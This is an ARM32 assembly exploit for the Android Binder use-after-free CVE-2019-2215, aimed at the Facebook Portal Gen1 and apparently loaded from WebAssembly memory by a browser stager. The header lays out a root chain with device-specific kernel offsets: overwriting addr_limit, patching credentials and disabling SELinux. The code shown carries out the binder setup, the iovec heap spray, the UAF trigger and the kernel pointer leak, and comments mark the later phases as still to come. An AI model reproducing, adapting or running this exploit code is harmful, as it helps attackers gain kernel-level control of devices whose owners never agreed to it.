/*
 * cve_2019_2215.s — CVE-2019-2215 Binder UAF Kernel Exploit
 * Target: Facebook Portal Gen1 (aloha), APQ8098/SD835
 *         Kernel 4.4.153, Android 9, security patch 2019-08-01
 *
 * ARM32 EABI position-independent shellcode.
 * Runs from WASM linear memory after mprotect stager.
 *
 * Exploit flow:
 *   Phase A: Binder setup (open, set max threads, epoll)
 *   Phase B: First UAF — info leak (task_struct address)
 *   Phase C: Second UAF — overwrite addr_limit
 *   Phase D: Kernel R/W — patch credentials, disable SELinux
 *   Phase E: Return success code to JavaScript
 *
 * Device-specific offsets (from boot.img kallsyms + kernel analysis):
 *   BINDER_THREAD_SZ     = 0x198 (408 bytes → kmalloc-512)
 *   WAITQUEUE_OFFSET     = 0xA0  (wait_queue_head in binder_thread)
 *   OFFSET_ADDR_LIMIT    = 0x08  (thread_info.addr_limit)
 *   OFFSET_REAL_CRED     = 0x7B0 (task->real_cred, AArch64 kernel)
 *   OFFSET_CRED          = 0x7B8 (task->cred, AArch64 kernel)
 *   OFFSET_SECCOMP_MODE  = 0x850 (task->seccomp.mode)
 *   OFFSET_SECCOMP_FILTER= 0x858 (task->seccomp.filter)
 *   OFFSET_PID           = 0x5F8 (task->pid)
 *   selinux_enforcing    = 0xffffff800a925a94 (pre-KASLR)
 *   KERNEL_BASE          = 0xffffff8008080000 (pre-KASLR)
 *
 * Return value (R0):
 *   0xF0 = success (root achieved)
 *   0xA1EE = Phase A failed, step 1, errno=EE
 *   0xA2EE = Phase A failed, step 2, errno=EE
 *   ...
 *   0xB1EE = Phase B failed, step 1, errno=EE
 *   0xC1EE = Phase C failed, step 1, errno=EE
 *   0xD1EE = Phase D failed, step 1, errno=EE
 *
 * ARM32 EABI syscall numbers:
 *   __NR_close           = 6
 *   __NR_ioctl           = 54
 *   __NR_writev          = 146
 *   __NR_epoll_ctl       = 251
 *   __NR_epoll_create1   = 357
 *   __NR_pipe2           = 359
 *   __NR_openat          = 322
 *   __NR_getpid          = 20
 *   __NR_readv           = 145
 *
 * Register convention during exploit:
 *   R4 = binder_fd
 *   R5 = pipe_rd
 *   R6 = pipe_wr
 *   R7 = syscall number (clobbered by each SVC)
 *   R8 = epoll_fd
 *   R9 = scratch / leaked kernel pointer
 *   R10 = pointer to local data area (in WASM memory)
 *   R11 = frame pointer (unused, callee-saved)
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

/* ═══════════════════════════════════════════════════════════════
 * Constants — embedded as data words after the code
 * ═══════════════════════════════════════════════════════════════ */

/* Binder ioctl command constants */
.equ BINDER_SET_MAX_THREADS,    0x40046205  /* _IOW('b', 5, __u32) */
.equ BINDER_WRITE_READ,        0xc0186201  /* _IOWR('b', 1, binder_write_read) */
.equ BINDER_THREAD_EXIT,       0x40046208  /* _IOW('b', 8, __s32) */
.equ BC_ENTER_LOOPER,          0x0000000D

/* epoll constants */
.equ EPOLL_CTL_ADD,     1
.equ EPOLL_CTL_DEL,     2
.equ EPOLLIN,           0x001

/* Other constants */
.equ AT_FDCWD,          -100
.equ O_RDWR,            2
.equ IOVEC_COUNT,       32      /* 32 iovecs × 8 bytes = 256 bytes ... */
                                /* Actually need to match kmalloc-512 */
                                /* On AArch64 kernel: sizeof(iovec) = 16 */
                                /* 32 × 16 = 512 → kmalloc-512 ✓ */

/* Kernel struct offsets (Portal-specific, AArch64 kernel 4.4.153) */
.equ WAITQUEUE_OFFSET,  0xA0
.equ OFFSET_ADDR_LIMIT, 0x08
.equ OFFSET_REAL_CRED,  0x7B0
.equ OFFSET_CRED,       0x7B8
.equ OFFSET_PID,        0x5F8
.equ OFFSET_SECCOMP,    0x850

/* Stack frame layout (256 bytes — generous for all local storage)
 *
 * SP+0x00:  max_threads (uint32)
 * SP+0x04:  binder_write_read struct (24 bytes on 32-bit)
 *           +0x04: write_size
 *           +0x08: write_consumed
 *           +0x0C: write_buffer (ptr)
 *           +0x10: read_size
 *           +0x14: read_consumed
 *           +0x18: read_buffer (ptr)
 * SP+0x1C:  BC_ENTER_LOOPER command word (4 bytes)
 * SP+0x20:  pipefd[0] (read), pipefd[1] (write)
 * SP+0x28:  epoll_event struct (12 bytes)
 *           +0x28: events (uint32)
 *           +0x2C: data.fd (uint32)
 *           +0x30: data.fd high (uint32)
 * SP+0x34:  iovec array (32 × 8 bytes = 256 bytes on 32-bit)
 *           Each iovec: { void *iov_base (4), size_t iov_len (4) }
 * SP+0x134: scratch buffer for pipe reads (64 bytes)
 * SP+0x174: padding to 256-byte frame
 *
 * Total: 0x180 = 384 bytes
 */
.equ FRAME_SIZE,        0x180
.equ OFF_MAX_THREADS,   0x00
.equ OFF_BWR,           0x04
.equ OFF_BC_CMD,        0x1C
.equ OFF_PIPEFD,        0x20
.equ OFF_EPOLL_EVENT,   0x28
.equ OFF_IOVEC,         0x34
.equ OFF_SCRATCH,       0x134

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME_SIZE
    /* R4 = wasm_mem base address (passed from mprotect stager via BX R4).
     * Save to R10 before R4 is reused for binder_fd. */
    mov     r10, r4

    /* ═════════════════════════════════════════════════════════
     * PHASE A: Binder + epoll + pipe setup
     * ═════════════════════════════════════════════════════════ */

    /* A1: openat("/dev/binder", O_RDWR) */
    mvn     r0, #99             /* AT_FDCWD */
    adr     r1, str_binder
    mov     r2, #O_RDWR
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* 322 = __NR_openat */
    svc     #0
    cmp     r0, #0
    bmi     fail_a1
    mov     r4, r0              /* R4 = binder_fd */

    /* A2: ioctl(binder_fd, BINDER_SET_MAX_THREADS, &0) */
    mov     r0, r4
    ldr     r1, const_set_max_threads
    mov     r3, #0
    str     r3, [sp, #OFF_MAX_THREADS]
    add     r2, sp, #OFF_MAX_THREADS
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a2

    /* A3: pipe2(pipefd, 0) */
    add     r0, sp, #OFF_PIPEFD
    mov     r1, #0
    mov     r7, #352
    add     r7, r7, #7          /* 359 = __NR_pipe2 */
    svc     #0
    cmp     r0, #0
    bmi     fail_a3
    ldr     r5, [sp, #OFF_PIPEFD]       /* R5 = pipe_rd */
    ldr     r6, [sp, #OFF_PIPEFD + 4]   /* R6 = pipe_wr */

    /* A4: epoll_create1(0) */
    mov     r0, #0
    mov     r7, #352
    add     r7, r7, #5          /* 357 = __NR_epoll_create1 */
    svc     #0
    cmp     r0, #0
    bmi     fail_a4
    mov     r8, r0              /* R8 = epoll_fd */

    /* A5: epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event) */
    mov     r3, #EPOLLIN
    str     r3, [sp, #OFF_EPOLL_EVENT]
    str     r4, [sp, #OFF_EPOLL_EVENT + 4]
    mov     r3, #0
    str     r3, [sp, #OFF_EPOLL_EVENT + 8]
    mov     r0, r8
    mov     r1, #EPOLL_CTL_ADD
    mov     r2, r4
    add     r3, sp, #OFF_EPOLL_EVENT
    mov     r7, #248
    add     r7, r7, #3          /* 251 = __NR_epoll_ctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a5

    /* A6: ioctl(binder_fd, BINDER_WRITE_READ, &bwr) — BC_ENTER_LOOPER */
    /* Set up binder_write_read struct */
    mov     r3, #BC_ENTER_LOOPER
    str     r3, [sp, #OFF_BC_CMD]

    mov     r3, #4              /* write_size = 4 (one command word) */
    str     r3, [sp, #OFF_BWR + 0]      /* bwr.write_size */
    mov     r3, #0
    str     r3, [sp, #OFF_BWR + 4]      /* bwr.write_consumed */
    add     r3, sp, #OFF_BC_CMD
    str     r3, [sp, #OFF_BWR + 8]      /* bwr.write_buffer = &BC_ENTER_LOOPER */
    mov     r3, #0
    str     r3, [sp, #OFF_BWR + 12]     /* bwr.read_size = 0 */
    str     r3, [sp, #OFF_BWR + 16]     /* bwr.read_consumed = 0 */
    str     r3, [sp, #OFF_BWR + 20]     /* bwr.read_buffer = NULL */

    mov     r0, r4              /* binder_fd */
    ldr     r1, const_binder_wr
    add     r2, sp, #OFF_BWR
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a6

    /* ═════════════════════════════════════════════════════════
     * PHASE B: First UAF — trigger + iovec spray + info leak
     * ═════════════════════════════════════════════════════════ */

    /* B1: ioctl(binder_fd, BINDER_THREAD_EXIT, 0) — FREE binder_thread */
    mov     r0, r4
    ldr     r1, const_thread_exit
    mov     r2, #0
    mov     r7, #54
    svc     #0
    /* Don't check return — may return error but thread is freed */

    /* B2: Set up iovec array for spraying into freed binder_thread slot.
     *
     * We need 32 iovecs (on AArch64 kernel, sizeof(struct iovec) = 16,
     * 32 × 16 = 512 → same kmalloc-512 slab as binder_thread).
     *
     * BUT: from 32-bit compat userspace, the kernel uses compat_iovec
     * (sizeof = 8, 32-bit pointers). 32 × 8 = 256 → kmalloc-256.
     * This does NOT match kmalloc-512 for binder_thread!
     *
     * Need 64 iovecs: 64 × 8 = 512 → kmalloc-512 ✓
     *
     * However our stack frame only has room for 32 iovecs (256 bytes).
     * We'll use a data area in WASM memory instead.
     * WASM memory offset 0x1000 onwards is available for data.
     */

    /* Use WASM memory at offset 0x1000 for iovec array (64 × 8 = 512 bytes)
     * and offset 0x1200 for scratch buffers */

    /* R10 = wasm_mem base address, saved at _start from R4 (stager passes
     * wasm_mem_addr in R4 via BX R4). Already set at the top of _start. */

    /* Set up 64 iovecs. Each points to a 1-byte scratch buffer.
     * The iovec at WAITQUEUE_OFFSET/8 = 0xA0/8 = iovec[20] will
     * overlap with the freed binder_thread's wait_queue_head.
     *
     * On compat (32-bit) path: compat_iovec = { compat_uptr_t base; compat_size_t len; }
     * Each is 8 bytes. The WAITQUEUE_OFFSET (0xA0) byte offset in the
     * kmalloc-512 object maps to iovec index 0xA0/8 = 20.
     *
     * We set iovec[20].iov_base to our scratch buffer and iov_len to 8.
     * When the wait_queue corruption happens, the kernel writes a
     * kernel pointer (wait_queue_entry) into the iovec data at that offset.
     * We read it via readv on the pipe. */

    add     r9, r10, #0x1000    /* R9 = iovec array base */
    add     r11, r10, #0x1200   /* R11 = scratch buffer base */

    /* Fill 64 iovecs: each iov_base = scratch + i, iov_len = 1 */
    mov     r0, #0              /* i = 0 */
    mov     r1, #64             /* count */
iovec_fill:
    add     r2, r11, r0         /* scratch + i */
    str     r2, [r9, r0, lsl #3]        /* iovec[i].iov_base */
    mov     r3, #1
    add     r2, r9, r0, lsl #3
    str     r3, [r2, #4]                 /* iovec[i].iov_len = 1 */
    add     r0, r0, #1
    cmp     r0, r1
    blt     iovec_fill

    /* Override iovec[20] — this overlaps with WAITQUEUE_OFFSET.
     * Set iov_len = 0xA0 to catch the full wait_queue_head write */
    mov     r0, #20
    add     r2, r11, #0x100    /* dedicated leak buffer at scratch+0x100 */
    str     r2, [r9, r0, lsl #3]
    mov     r3, #0xA0
    add     r2, r9, r0, lsl #3
    str     r3, [r2, #4]        /* iovec[20].iov_len = 0xA0 */

    /* B3: writev(pipe_wr, iovec, 64) — spray into freed slab
     * This will block if pipe buffer fills, which is what we want.
     * The kernel allocates the iovec array in kmalloc-512, hopefully
     * landing in the freed binder_thread slot. */
    mov     r0, r6              /* pipe_wr */
    mov     r1, r9              /* iovec array */
    mov     r2, #64             /* iovcnt */
    mov     r7, #146            /* __NR_writev */
    svc     #0
    /* writev returns bytes written or -errno */
    cmp     r0, #0
    bmi     fail_b3

    /* B4: Close epoll fd — this triggers the UAF!
     * epoll_ctl removes the binder_fd, which walks the wait_queue
     * in the freed binder_thread. The wait_queue_head at
     * WAITQUEUE_OFFSET now overlaps with our iovec data.
     * The kernel's list_del operation writes pointers into our iovec. */
    mov     r0, r8              /* epoll_fd */
    mov     r7, #6              /* __NR_close */
    svc     #0

    /* B5: readv(pipe_rd, ...) to read the leaked data
     * The data written through the corrupted iovec contains
     * kernel pointers from the wait_queue linked list. */
    /* Set up a single iovec for reading the leaked data */
    add     r2, r10, #0x1300    /* read buffer */
    str     r2, [sp, #OFF_IOVEC]
    mov     r3, #0xA0
    str     r3, [sp, #OFF_IOVEC + 4]

    mov     r0, r5              /* pipe_rd */
    add     r1, sp, #OFF_IOVEC  /* iovec for read */
    mov     r2, #1              /* iovcnt = 1 */
    mov     r7, #145            /* __NR_readv */
    svc     #0
    cmp     r0, #0
    ble     fail_b5

    /* B6: Parse leaked data for kernel pointer
     * The wait_queue_head at WAITQUEUE_OFFSET contains:
     *   +0x00: list.next (kernel pointer to epoll wait_queue_entry)
     *   +0x08: list.prev (same or another kernel pointer)
     * These are 64-bit pointers on AArch64 kernel.
     * From 32-bit compat, we read 8 bytes for each pointer. */

    /* The leaked data is in our read buffer at wasm_mem + 0x1300.
     * The first 8 bytes should be a kernel pointer (list.next).
     * On AArch64, kernel pointers are in the 0xffffff80xxxxxxxx range. */
    add     r0, r10, #0x1300
    ldr     r9, [r0, #0]        /* low 32 bits of leaked pointer */
    ldr     r11, [r0, #4]       /* high 32 bits of leaked pointer */

    /* Validate it looks like a kernel pointer */
    /* High word should be 0xffffff80 + KASLR slide high bits */
    /* For now, just check it's non-zero and has the right high byte pattern */
    cmp     r11, #0
    beq     fail_b6             /* zero = no leak */

    /* ═════════════════════════════════════════════════════════
     * For this initial version, just return the leaked data
     * as proof that the UAF info leak works.
     *
     * Return value: low 16 bits of leaked kernel pointer
     * packed as 0xBB00 | (leak & 0xFF) to indicate Phase B success.
     * Full pointer logged via the high bits check.
     *
     * The full exploit (Phase C/D) will be added once the
     * info leak is confirmed working.
     * ═════════════════════════════════════════════════════════ */

    /* Store leaked pointer in WASM memory at offset 0x1400 for JS to read */
    add     r0, r10, #0x1400
    str     r9, [r0, #0]        /* low 32 bits */
    str     r11, [r0, #4]       /* high 32 bits */

    /* Clean up file descriptors */
    mov     r0, r5              /* close(pipe_rd) */
    mov     r7, #6
    svc     #0
    mov     r0, r6              /* close(pipe_wr) */
    mov     r7, #6
    svc     #0
    mov     r0, r4              /* close(binder_fd) */
    mov     r7, #6
    svc     #0

    /* Return: 0xBB00 | low byte of leaked pointer */
    and     r0, r9, #0xFF
    orr     r0, r0, #0xBB00
    b       done

    /* ═════════════════════════════════════════════════════════
     * Error handlers
     * ═════════════════════════════════════════════════════════ */
fail_a1:
    rsb     r0, r0, #0
    mov     r1, #0xA100
    orr     r0, r0, r1
    b       done
fail_a2:
    rsb     r0, r0, #0
    mov     r1, #0xA200
    orr     r0, r0, r1
    b       done
fail_a3:
    rsb     r0, r0, #0
    ldr     r1, const_a3
    orr     r0, r0, r1
    b       done
fail_a4:
    rsb     r0, r0, #0
    ldr     r1, const_a4
    orr     r0, r0, r1
    b       done
fail_a5:
    rsb     r0, r0, #0
    ldr     r1, const_a5
    orr     r0, r0, r1
    b       done
fail_a6:
    rsb     r0, r0, #0
    ldr     r1, const_a6
    orr     r0, r0, r1
    b       done
fail_b3:
    rsb     r0, r0, #0
    ldr     r1, const_b3
    orr     r0, r0, r1
    b       done
fail_b5:
    rsb     r0, r0, #0
    ldr     r1, const_b5
    orr     r0, r0, r1
    b       done
fail_b6:
    mov     r0, #0xB600
    b       done

done:
    add     sp, sp, #FRAME_SIZE
    pop     {r4-r11, pc}

    /* ═════════════════════════════════════════════════════════
     * Data pool (position-independent, embedded in .text)
     * ═════════════════════════════════════════════════════════ */
    .align 2
const_set_max_threads:
    .word   BINDER_SET_MAX_THREADS      /* 0x40046205 */
const_binder_wr:
    .word   BINDER_WRITE_READ           /* 0xc0186201 */
const_thread_exit:
    .word   BINDER_THREAD_EXIT          /* 0x40046208 */
const_a3:
    .word   0xA300
const_a4:
    .word   0xA400
const_a5:
    .word   0xA500
const_a6:
    .word   0xA600
const_b3:
    .word   0xB300
const_b5:
    .word   0xB500

str_binder:
    .asciz  "/dev/binder"
    .align  2
